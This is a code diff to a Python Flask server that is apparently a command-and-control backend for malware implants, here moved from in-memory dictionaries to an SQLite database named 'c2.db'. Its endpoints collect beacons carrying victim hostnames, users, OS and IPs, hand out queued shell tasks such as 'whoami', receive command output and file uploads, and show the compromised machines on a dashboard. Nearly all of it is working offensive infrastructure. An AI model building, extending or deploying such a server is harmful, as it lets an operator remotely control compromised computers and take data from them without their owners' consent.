@@ -6,10 +6,15 @@ from werkzeug.utils import secure_filename
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
 from datetime import datetime, timezone
+import sqlite3
+from flask import g
+
+
 app = Flask(__name__)
 load_dotenv()
 
 API_KEY = os.getenv("API_KEY")
+DATABASE = "c2.db"
 
 
 # --- Configuration ---
@@ -21,17 +26,17 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.secret_key = SECRET_KEY
 
 # --- Users ---
-users = {"admin": "password123"}
+#users = {"admin": "password123"}
 agents_creds = {"agent1": "pass1"}
 
 
 # --- Tasks dictionary keyed by UUID ---
-tasks = {
-    uuid.uuid4(): {"agent_id": "1", "task": {"type": "shell", "command": "whoami"}, "output": None}
-}
+#tasks = {
+#    uuid.uuid4(): {"agent_id": "1", "task": {"type": "shell", "command": "whoami"}, "output": None}
+#}
 
 # --- Live Agents dictionary ---
-agents = {}  # {agent_id: {'hostname':..., 'user':..., 'os':..., 'ip':..., 'last_seen': datetime}}
+#agents = {}  # {agent_id: {'hostname':..., 'user':..., 'os':..., 'ip':..., 'last_seen': datetime}}
 
 # --- Encryption functions ---
 def encrypt_data(data):
@@ -39,6 +44,21 @@ def encrypt_data(data):
 
 def decrypt_data(data):
     return cipher.decrypt(data.encode()).decode()
+
+
+# ---  Connecting to SQLite DB ---
+def get_db():
+    if "db" not in g:
+        g.db = sqlite3.connect(DATABASE)
+        g.db.row_factory = sqlite3.Row
+    return g.db
+
+@app.teardown_appcontext
+def close_db(exception):
+    db = g.pop("db", None)
+    if db is not None:
+        db.close()
+
 
 # --- Agent beacon endpoint ---
 @app.route('/beacon', methods=['POST'])
@@ -48,22 +68,39 @@ def beacon():
     beacon_info = json.loads(decrypted_json)
     agent_id = beacon_info.get("id")
 
-    # Store last_seen as datetime
-    agents[agent_id] = {
-        "hostname": beacon_info.get("hostname"),
-        "user": beacon_info.get("user"),
-        "os": beacon_info.get("os"),
-        "ip": request.remote_addr,
-        "last_seen": datetime.now(timezone.utc)
+    db = get_db()
+    db.execute("""
+        INSERT INTO agents (id, hostname, user, os, ip, last_seen)
+        VALUES (?, ?, ?, ?, ?, datetime('now'))
+        ON CONFLICT(id) DO UPDATE SET
+            hostname=excluded.hostname,
+            user=excluded.user,
+            os=excluded.os,
+            ip=excluded.ip,
+            last_seen=datetime('now')
+    """, (
+        agent_id,
+        beacon_info.get("hostname"),
+        beacon_info.get("user"),
+        beacon_info.get("os"),
+        request.remote_addr
+    ))
+    db.commit()
 
-    }
+    # Fetch pending task
+    task = db.execute("""
+        SELECT uuid, task_json FROM tasks
+        WHERE agent_id = ? AND output IS NULL
+        LIMIT 1
+    """, (agent_id,)).fetchone()
 
-    # Return first pending task for this agent
-    for task_uuid, t in tasks.items():
-        if t["agent_id"] == agent_id and t["output"] is None:
-            return jsonify({'task': t["task"], "uuid": str(task_uuid)})
+    if task:
+        return jsonify({
+            "task": json.loads(task["task_json"]),
+            "uuid": task["uuid"]
+        })
 
-    return jsonify({'task': None})
+    return jsonify({"task": None})
 
 # --- Live agents API ---
 AGENT_ONLINE_TIMEOUT = 30  # seconds
@@ -71,22 +108,32 @@ AGENT_ONLINE_TIMEOUT = 30  # seconds
 @app.route("/agents-data")
 def agents_data():
     now = datetime.now(timezone.utc)
-    data = []
 
-    for agent_id, agent in agents.items():
-        last_seen = agent['last_seen']
+    db = get_db()
+    rows = db.execute("SELECT * FROM agents").fetchall()
+
+    data = []
+    for row in rows:
+        last_seen = datetime.fromisoformat(row["last_seen"])
+
+        # FIX: ensure timezone-aware
+        if last_seen.tzinfo is None:
+            last_seen = last_seen.replace(tzinfo=timezone.utc)
+
         online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT
+
         data.append({
-            "id": agent_id,
-            "hostname": agent.get("hostname", ""),
-            "user": agent.get("user", ""),
-            "os": agent.get("os", ""),
-            "ip": agent.get("ip", ""),
+            "id": row["id"],
+            "hostname": row["hostname"],
+            "user": row["user"],
+            "os": row["os"],
+            "ip": row["ip"],
             "last_seen": last_seen.timestamp(),
             "online": online
         })
 
     return jsonify(data)
+
 
 # --- Agents page ---
 @app.route('/agents/')
@@ -97,12 +144,25 @@ def agents_list():
     now = datetime.now(timezone.utc)
     agent_rows = []
 
-    for agent_id, agent in agents.items():
-        last_seen = agent['last_seen']
+    db = get_db()
+    agents = db.execute("SELECT * FROM agents").fetchall()
+
+    for agent in agents:
+        last_seen = datetime.fromisoformat(agent["last_seen"])
+
+        # Ensure timezone-aware
+        if last_seen.tzinfo is None:
+            last_seen = last_seen.replace(tzinfo=timezone.utc)
+
         online = (now - last_seen).total_seconds() <= AGENT_ONLINE_TIMEOUT
-        pending_tasks = sum(1 for t in tasks.values() if t["agent_id"] == agent_id and t["output"] is None)
+
+        pending_tasks = db.execute("""
+            SELECT COUNT(*) FROM tasks
+            WHERE agent_id = ? AND output IS NULL
+        """, (agent["id"],)).fetchone()[0]
+
         agent_rows.append({
-            "id": agent_id,
+            "id": agent["id"],
             "status": "online" if online else "offline",
             "last_seen": last_seen.strftime("%Y-%m-%d %H:%M:%S"),
             "pending_tasks": pending_tasks
@@ -110,21 +170,32 @@ def agents_list():
 
     return render_template('agents.html', agents=agent_rows)
 
+
 # --- Agent detail page ---
 @app.route('/agents/<agent_id>')
 def agent_detail(agent_id):
     if "username" not in session:
         return redirect(url_for("login"))
 
-    agent_tasks = []
-    for task_uuid, t in tasks.items():
-        if t['agent_id'] == agent_id:
-            agent_tasks.append({
-                "uuid": str(task_uuid),
-                "task": t['task'],
-                "output": t['output']
-            })
-    return render_template('agent_detail.html', agent_id=agent_id, tasks=agent_tasks)
+    db = get_db()
+
+    # Fetch all tasks for this agent
+    tasks = db.execute("""
+        SELECT uuid, task_json, output
+        FROM tasks
+        WHERE agent_id = ?
+        ORDER BY rowid DESC
+    """, (agent_id,)).fetchall()
+
+    task_rows = []
+    for t in tasks:
+        task_rows.append({
+            "uuid": t["uuid"],
+            "task": json.loads(t["task_json"]),
+            "output": t["output"]
+        })
+
+    return render_template('agent_detail.html', agent_id=agent_id, tasks=task_rows)
 
 # --- Agent result endpoint ---
 @app.route('/result', methods=['POST'])
@@ -133,17 +204,15 @@ def result():
     decrypted_json = decrypt_data(encrypted)
     result_info = json.loads(decrypted_json)
 
-    agent_id = result_info.get('id')
-    output = result_info.get('output')
-    task_uuid_str = result_info.get('uuid')
+    task_uuid = result_info.get("uuid")
+    output = result_info.get("output")
 
-    try:
-        task_uuid = uuid.UUID(task_uuid_str)
-        if task_uuid in tasks:
-            tasks[task_uuid]["output"] = output
-            print(f"[+] Result from Agent {agent_id}, Task {task_uuid}: {output}")
-    except Exception:
-        print(f"[!] Invalid UUID from agent: {task_uuid_str}")
+    db = get_db()
+    db.execute("""
+        UPDATE tasks SET output = ?
+        WHERE uuid = ?
+    """, (output, task_uuid))
+    db.commit()
 
     return jsonify({"status": "received"})
 
@@ -158,12 +227,16 @@ def add_task():
     agent_id = data.get("id")
     command = data.get("task")
 
-    if not agent_id or not command:
-        return jsonify({"error": "Missing id or command"}), 400
+    task_uuid = str(uuid.uuid4())
 
-    task_uuid = uuid.uuid4()
-    tasks[task_uuid] = {"agent_id": agent_id, "task": command, "output": None}
-    return jsonify({"status": "accepted", "uuid": str(task_uuid)})
+    db = get_db()
+    db.execute("""
+        INSERT INTO tasks (uuid, agent_id, task_json, output)
+        VALUES (?, ?, ?, NULL)
+    """, (task_uuid, agent_id, json.dumps(command)))
+    db.commit()
+
+    return jsonify({"status": "accepted", "uuid": task_uuid})
 
 # --- File upload ---
 @app.route('/upload', methods=['POST'])
@@ -196,18 +269,25 @@ def uploads_list():
 @app.route("/login", methods=["GET", "POST"])
 def login():
 
+    db = get_db()
+
     # -------------------------
     # 1. Agent Login (JSON)
     # -------------------------
     if request.method == "POST" and request.is_json:
         data = request.get_json(silent=True) or {}
 
-        # Only treat as agent login if agent_id is present
         if "agent_id" in data:
             username = data.get("username")
             password = data.get("password")
 
-            if username in agents_creds and agents_creds[username] == password:
+            # Check credentials from SQLite
+            row = db.execute(
+                "SELECT password FROM users WHERE username = ?",
+                (username,)
+            ).fetchone()
+
+            if row and row["password"] == password:
                 return jsonify({"status": "agent_logged_in"}), 200
 
             return jsonify({"error": "Unauthorized"}), 401
@@ -219,7 +299,12 @@ def login():
         username = request.form.get("username")
         password = request.form.get("password")
 
-        if username in users and users[username] == password:
+        row = db.execute(
+            "SELECT password FROM users WHERE username = ?",
+            (username,)
+        ).fetchone()
+
+        if row and row["password"] == password:
             session["username"] = username
             return redirect(url_for("dashboard"))
 
@@ -245,31 +330,47 @@ def dashboard():
     if "username" not in session:
         return redirect(url_for("login"))
 
+    db = get_db()
+
     files = os.listdir(app.config['UPLOAD_FOLDER'])
 
-    # Convert UUID keys to strings for template
-    tasks_str = {str(k): v for k, v in tasks.items()}
+    task_rows = db.execute("""
+        SELECT uuid, agent_id, task_json, output
+        FROM tasks
+        ORDER BY rowid DESC
+    """).fetchall()
+
+    tasks_str = {}
+    for t in task_rows:
+        tasks_str[str(t["uuid"])] = {
+            "agent_id": t["agent_id"],
+            "task": json.loads(t["task_json"]),
+            "output": t["output"]
+        }
+
+    agents_db = db.execute("SELECT * FROM agents").fetchall()
 
     now = datetime.now(timezone.utc)
     agent_rows = []
-    for agent_id, agent in agents.items():
-        last_seen_dt = agent['last_seen']  # already datetime
+
+    for agent in agents_db:
+        last_seen_dt = datetime.fromisoformat(agent["last_seen"])
+
+        # Ensure timezone-aware
         if last_seen_dt.tzinfo is None:
             last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)
 
         online = (now - last_seen_dt).total_seconds() <= AGENT_ONLINE_TIMEOUT
 
         agent_rows.append({
-            "id": agent_id,
-            "hostname": agent.get("hostname", ""),
-            "user": agent.get("user", ""),
-            "os": agent.get("os", ""),
-            "ip": agent.get("ip", ""),
+            "id": agent["id"],
+            "hostname": agent["hostname"],
+            "user": agent["user"],
+            "os": agent["os"],
+            "ip": agent["ip"],
             "last_seen": last_seen_dt.strftime("%Y-%m-%d %H:%M:%S"),
             "status": "online" if online else "offline"
         })
-
-
 
     return render_template(
         "dashboard.html",
@@ -283,28 +384,47 @@ def dashboard():
 def tasks_data():
     if "username" not in session:
         return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({str(k): v for k, v in tasks.items()})
+
+    db = get_db()
+
+    rows = db.execute("""
+        SELECT uuid, agent_id, task_json, output
+        FROM tasks
+        ORDER BY rowid DESC
+    """).fetchall()
+
+    tasks_dict = {}
+    for t in rows:
+        tasks_dict[str(t["uuid"])] = {
+            "agent_id": t["agent_id"],
+            "task": json.loads(t["task_json"]),
+            "output": t["output"]
+        }
+
+    return jsonify(tasks_dict)
 
 @app.route('/tasks/')
 def tasks_list():
     if "username" not in session:
         return redirect(url_for("login"))
-    tasks_str = {str(k): v for k, v in tasks.items()}
-    return render_template('tasks.html', tasks=tasks_str)
 
-@app.route("/delete-task/<task_uuid>", methods=["POST"])
-def delete_task(task_uuid):
-    if "username" not in session:
-        return jsonify({"error": "Unauthorized"}), 401
-    try:
-        uuid_obj = uuid.UUID(task_uuid)
-        if uuid_obj in tasks:
-            del tasks[uuid_obj]
-            return jsonify({"status": "deleted"})
-        else:
-            return jsonify({"error": "Task not found"}), 404
-    except ValueError:
-        return jsonify({"error": "Invalid UUID"}), 400
+    db = get_db()
+
+    rows = db.execute("""
+        SELECT uuid, agent_id, task_json, output
+        FROM tasks
+        ORDER BY rowid DESC
+    """).fetchall()
+
+    tasks_str = {}
+    for t in rows:
+        tasks_str[str(t["uuid"])] = {
+            "agent_id": t["agent_id"],
+            "task": json.loads(t["task_json"]),
+            "output": t["output"]
+        }
+
+    return render_template('tasks.html', tasks=tasks_str)
 
 # --- Main ---
 if __name__ == "__main__":
